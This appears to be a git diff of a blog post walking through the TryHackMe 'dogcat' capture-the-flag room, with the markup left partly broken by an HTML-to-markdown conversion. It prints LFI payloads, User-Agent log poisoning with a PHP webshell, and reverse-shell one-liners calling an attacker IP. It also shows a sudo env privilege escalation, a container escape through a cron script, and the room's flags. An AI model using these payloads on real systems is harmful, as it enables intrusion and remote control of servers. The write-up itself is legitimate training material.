@@ -43,44 +43,50 @@
 <pre class="shell:#"><code>nmap -sC -sV -oN nmap.out 10.10.174.171</code></pre>
 <p>Open ports: * 22 - SSH * 80- http</p>
 <p>We have a look at the webpage where it lets us view some dot or cat pictures</p>
-<div class="figure">
-<img src="/img/tryhackme_dogcat/1.png" />
+<p><img src="/img/tryhackme_dogcat/1.png" /></p>
+<p>Having a look at the url, we see that the page is running a php that shows the pictures stored in the dogs/ or cats/ folder which passes the value “dog” or “cat” to the variable “view”.</p>
+<p>We try some basic LFI here to chech if we can view the /etc/passwd for example with the req url as:</p>
+<pre class="http://10.10.174.171/?view=../../../../../../../etc/passwd```"><code>
+But it fails showing that only dogs or cats are allowed.
 
-</div>
-<p>Having a look at the url, we see that the page is running a php that shows the pictures stored in the dogs/ or cats/ folder which passes the value &quot;dog&quot; or &quot;cat&quot; to the variable &quot;view&quot;.</p>
-<p>We try some basic LFI here to chech if we can view the /etc/passwd for example with the req url as: <code>http://10.10.174.171/?view=../../../../../../../etc/passwd</code></p>
-<p>But it fails showing that only dogs or cats are allowed.</p>
-<div class="figure">
-<img src="/img/tryhackme_dogcat/2.png" />
+![](/img/tryhackme_dogcat/2.png)
 
-</div>
-<p>So it checks for a string dog or cat in the provided value of view. We try adding &quot;dog&quot; after a null byte %00 so that it passes the string check but is not evaluated when showing the file. We get the following:</p>
-<div class="figure">
-<img src="/img/tryhackme_dogcat/3.png" />
+So it checks for a string dog or cat in the provided value of view. We try
+adding &quot;dog&quot; after a null byte %00 so that it passes the string check but is
+not evaluated when showing the file. We get the following:
 
-</div>
-<p>We see that we do bypass the string check but it fails to open a the file.</p>
-<p>Accidentally passing dogs to the view variable, we find that the script also adds the extension .php to the end of the file to be viewed passed in the view variable</p>
-<div class="figure">
-<img src="/img/tryhackme_dogcat/4.png" />
+![](/img/tryhackme_dogcat/3.png)
 
-</div>
-<h2 id="local-file-inclusion">## Local File Inclusion</h2>
-<p>Googling a bit, we find a new php LFI technique found <a href="https://diablohorn.com/2010/01/16/interesting-local-file-inclusion-method/">here</a>.</p>
-<p>I originally found it in <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion">payloadsallthethings</a> which is a great source for pentesters.</p>
-<p>We use the technique to get our base64 encoded php source of dog.php and decode it to view the source.</p>
-<p><code>http://10.10.174.171/?view=php://filter/convert.base64-encode/resource=dog</code></p>
-<div class="figure">
-<img src="/img/tryhackme_dogcat/5.png" />
+We see that we do bypass the string check but it fails to open a the file.
 
-</div>
-<div class="figure">
-<img src="/img/tryhackme_dogcat/6.png" />
+Accidentally passing dogs to the view variable, we find that the script also
+adds the extension .php to the end of the file to be viewed passed in the view
+variable
 
-</div>
-<p>Now we see that we can also check the source of the index.php file using directroy traversal in the same way</p>
-<p><code>http://10.10.174.171/?view=php://filter/convert.base64-encode/resource=dog/../index</code></p>
-<pre class="index.php"><code>&lt;!DOCCTYPE HTML&gt;
+![](/img/tryhackme_dogcat/4.png)
+
+## Local File Inclusion
+---
+Googling a bit, we find a new php LFI technique found [here](https://diablohorn.com/2010/01/16/interesting-local-file-inclusion-method/). 
+
+I originally found it in [payloadsallthethings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion) which is a great source for pentesters.
+
+We use the technique to get our base64 encoded php source of dog.php and decode
+it to view the source.
+
+```http://10.10.174.171/?view=php://filter/convert.base64-encode/resource=dog```
+
+![](/img/tryhackme_dogcat/5.png)
+
+![](/img/tryhackme_dogcat/6.png)
+
+Now we see that we can also check the source of the index.php file using
+directroy traversal in the same way
+
+```http://10.10.174.171/?view=php://filter/convert.base64-encode/resource=dog/../index```
+
+```index.php
+&lt;!DOCCTYPE HTML&gt;
 &lt;html&gt;
 
 &lt;head&gt;
@@ -115,101 +121,130 @@ containsStr($_GET[&#39;view&#39;], &#39;cat&#39;)) {
 &lt;/body&gt;
 
 &lt;/html&gt;</code></pre>
-<p>What's interesting here is that it allows us to pass an &quot;ext&quot; variable that contains the file extension. On the variable being unset, it adds the default extension of .php</p>
-<p>So we check now if we can read the /etc/passwd file with the following request <code>http://10.10.174.171/?view=dog/../../../../etc/passwd&amp;ext=</code></p>
-<p>And we see that we can!</p>
-<div class="figure">
-<img src="/img/tryhackme_dogcat/7.png" />
+<p>What’s interesting here is that it allows us to pass an “ext” variable that contains the file extension. On the variable being unset, it adds the default extension of .php</p>
+<p>So we check now if we can read the /etc/passwd file with the following request</p>
+<pre class="http://10.10.174.171/?view=dog/../../../../etc/passwd&amp;ext=```"><code>
+And we see that we can!
 
-</div>
-<p>Now we check if we can find the log file where it logs all our requests. After fiddling around for a bit, we find the logs in the /var/log/apache2/access.log finding out that the server is running apache2. And we see our last request there.</p>
-<div class="figure">
-<img src="/img/tryhackme_dogcat/8.png" />
+![](/img/tryhackme_dogcat/7.png)
 
-</div>
-<p>We see that the log also saves our user-agent header, in our case, Mozilla Firefox</p>
-<p>So, we check if we can inject some php code into our user-agent header that will also get executed along with the main php file.</p>
-<p>We can do this using burpsuite repeater to test again and again.</p>
-<p>We change the header to hello to test and it works</p>
-<div class="figure">
-<img src="/img/tryhackme_dogcat/9.png" />
 
-</div>
-<p>Now we test some php commands. First we try the system(&quot;<cmd>&quot;) which is suposed to execute the command on the machine and print us the output <code>&lt;?php system(&quot;ls&quot;)?&gt;</code></p>
-<p>But executing this once, we somehow break the machine and cannot access the log any more <img src="/img/tryhackme_dogcat/10.png" /></p>
-<p>Next we try a webshell like approach that will get a command passed in the cmd variable and execute it. <code>system($_GET['cmd']);</code></p>
-<div class="figure">
-<img src="/img/tryhackme_dogcat/11.png" />
+Now we check if we can find the log file where it logs all our requests. After
+fiddling around for a bit, we find the logs in the /var/log/apache2/access.log
+finding out that the server is running apache2. And we see our last request
+there.
 
-</div>
-<p>And we have command execution!</p>
-<h2 id="user-www-data">## User www-data</h2>
-<p>We try some commands and see that we are www-data, we try getting a reverse shell using php. The php reverse shell: <code>php -r '$sock=fsockopen(&quot;10.8.6.75&quot;, 8888);exec(&quot;/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);'</code></p>
-<p>We must url encode the revshell passed in the command. The url encoded request stands: <code>10.10.12.161/?view=dog/../../../../var/log/apache2/access.log&amp;ext=&amp;cmd=php -r '$sock=fsockopen(&quot;10.8.6.75&quot;,1337);exec(&quot;/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);'</code></p>
-<p>We start a nc listener on port 1337 and get the reverse shell.</p>
-<div class="figure">
-<img src="/img/tryhackme_dogcat/12.png" />
+![](/img/tryhackme_dogcat/8.png)
 
-</div>
-<h2 id="flag1">## flag1</h2>
-<p>Right away, we find the flag.php in the current folder. We cat out the contents to get the flag.</p>
-<div class="figure">
-<img src="/img/tryhackme_dogcat/13.png" />
+We see that the log also saves our user-agent header, in our case, Mozilla
+Firefox
 
-</div>
-<p><strong>flag1=&quot;THM{Th1s_1s_N0t_4_Catdog_ab67edfa}&quot;</strong></p>
-<h2 id="flag2">##flag2</h2>
-<p>After digging around the files for a bit, we find our second flag in the /var/www directory.</p>
-<div class="figure">
-<img src="/img/tryhackme_dogcat/14.png" />
+So, we check if we can inject some php code into our user-agent header that will
+also get executed along with the main php file.
 
-</div>
-<p><strong>flag2 = THM{LF1_t0_RC3_aec3fb}</strong></p>
-<h2 id="privilege-escalation---root">## Privilege escalation - Root</h2>
-<p>Next, we try to escalate our privilege to root. We try some enumeration and find that our user can execute /usr/bin/env as sudo using the command <code>sudo -l</code></p>
-<div class="figure">
-<img src="/img/tryhackme_dogcat/15.png" />
+We can do this using burpsuite repeater to test again and again.
 
-</div>
-<p>We look for privesc using env in <a href="https://gtfobins.github.io/gtfobins/env/#shell">gtfobins</a></p>
-<p>We find that a simple <code>env /bin/sh</code> gives us the shell. So we try that.</p>
-<div class="figure">
-<img src="/img/tryhackme_dogcat/16.png" />
+We change the header to hello to test and it works
 
-</div>
-<h2 id="flag3">## flag3</h2>
-<p>And, we have escalated to root successfully. lets look for the remaining flags.We find our 3rd flag in the /root directory.</p>
-<div class="figure">
-<img src="/img/tryhackme_dogcat/17.png" />
+![](/img/tryhackme_dogcat/9.png)
 
-</div>
-<p><strong>flag3 = &quot;THM{D1ff3r3nt_3nv1ronments_874112}&quot;</strong></p>
-<p>The flag tells us something about a different environment.</p>
-<p>Looking around for a bit, we find a .dockerenv file in the root directory, which tells us that we are running inside a docker container.</p>
-<div class="figure">
-<img src="/img/tryhackme_dogcat/18.png" />
+Now we test some php commands. First we try the system(&quot;&lt;cmd&gt;&quot;) which is
+suposed to execute the command on the machine and print us the output
+```&lt;?php system(&quot;ls&quot;)?&gt;```
 
-</div>
-<p>After some looking around, we find an interesting folder in the /opt/backups directory, having a look at the backup.sh file, we find the following</p>
-<div class="sourceCode"><pre class="sourceCode backup.sh"><code class="sourceCode bash"><span class="fu">tar</span> cf /root/container/backup/backup.tar /root/container</code></pre></div>
+But executing this once, we somehow break the machine and cannot access the log
+any more
+![](/img/tryhackme_dogcat/10.png)
+
+Next we try a webshell like approach that will get a command passed in the
+cmd variable and execute it.
+```system($_GET[&#39;cmd&#39;]);```
+
+![](/img/tryhackme_dogcat/11.png)
+
+And we have command execution!
+
+
+## User www-data
+---
+We try some commands and see that we are www-data, we try getting a reverse
+shell using php. The php reverse shell:
+```php -r &#39;$sock=fsockopen(&quot;10.8.6.75&quot;, 8888);exec(&quot;/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;```
+
+We must url encode the revshell passed in the command. The url encoded request
+stands:
+```10.10.12.161/?view=dog/../../../../var/log/apache2/access.log&amp;ext=&amp;cmd=php -r &#39;$sock=fsockopen(&quot;10.8.6.75&quot;,1337);exec(&quot;/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;```
+
+We start a nc listener on port 1337 and get the reverse shell.
+
+![](/img/tryhackme_dogcat/12.png)
+
+## flag1
+---
+
+Right away, we find the flag.php in the current folder. We cat out the contents
+to get the flag.
+
+![](/img/tryhackme_dogcat/13.png)
+
+**flag1=&quot;THM{Th1s_1s_N0t_4_Catdog_ab67edfa}&quot;**
+
+##flag2
+---
+
+After digging around the files for a bit, we find our second flag in the
+/var/www directory.
+
+![](/img/tryhackme_dogcat/14.png)
+
+**flag2 = THM{LF1_t0_RC3_aec3fb}**
+
+## Privilege escalation - Root
+---
+
+Next, we try to escalate our privilege to root. We try some enumeration and
+find that our user can execute /usr/bin/env as sudo using the command ```sudo
+-l```
+
+![](/img/tryhackme_dogcat/15.png)
+
+We look for privesc using env in [gtfobins](https://gtfobins.github.io/gtfobins/env/#shell)
+
+We find that a simple ```env /bin/sh``` gives us the shell. So we try that.
+
+![](/img/tryhackme_dogcat/16.png)
+
+## flag3
+---
+
+And, we have escalated to root successfully. lets look for the remaining
+flags.We find our 3rd flag in the /root directory.
+
+![](/img/tryhackme_dogcat/17.png)
+
+**flag3 = &quot;THM{D1ff3r3nt_3nv1ronments_874112}&quot;**
+
+The flag tells us something about a different environment. 
+
+Looking around for a bit, we find a .dockerenv file in the root directory,
+which tells us that we are running inside a docker container.
+
+![](/img/tryhackme_dogcat/18.png)
+
+After some looking around, we find an interesting folder in the /opt/backups 
+directory, having a look at the backup.sh file, we find the following
+
+```backup.sh
+tar cf /root/container/backup/backup.tar /root/container</code></pre>
 <h2 id="getting-out-of-container">## Getting out of container</h2>
 <p>So the script basically backs up the /root/container to the backup.tar file we found. It might be running a cron job. We see that we have write permissions to the file and so, lets try writing a reverse shell into the backup.sh file.</p>
-<div class="figure">
-<img src="/img/tryhackme_dogcat/19.png" />
-
-</div>
+<p><img src="/img/tryhackme_dogcat/19.png" /></p>
 <p>We open up a netcat listener on port 8888 and after some time, get a shell back from root.</p>
-<div class="figure">
-<img src="/img/tryhackme_dogcat/20.png" />
-
-</div>
+<p><img src="/img/tryhackme_dogcat/20.png" /></p>
 <h2 id="flag4">## flag4</h2>
 <p>This time, we see that we are on the machine iteself and not inside a docker container. Going into the root home, /root, we fine our flag4:</p>
-<div class="figure">
-<img src="/img/tryhackme_dogcat/21.png" />
-
-</div>
-<p><strong>flag4 = &quot;THM{esc4l4tions_on_esc4l4tions_on_esc4l4tions_7a52b17dba6ebb0dc38bc1049bcba02d}&quot;</strong></p>
+<p><img src="/img/tryhackme_dogcat/21.png" /></p>
+<p><strong>flag4 = “THM{esc4l4tions_on_esc4l4tions_on_esc4l4tions_7a52b17dba6ebb0dc38bc1049bcba02d}”</strong></p>
 <p>New topics learnt: * Chech the logs * docker container, cronjob * New php lfi technique</p>
 </article>
 
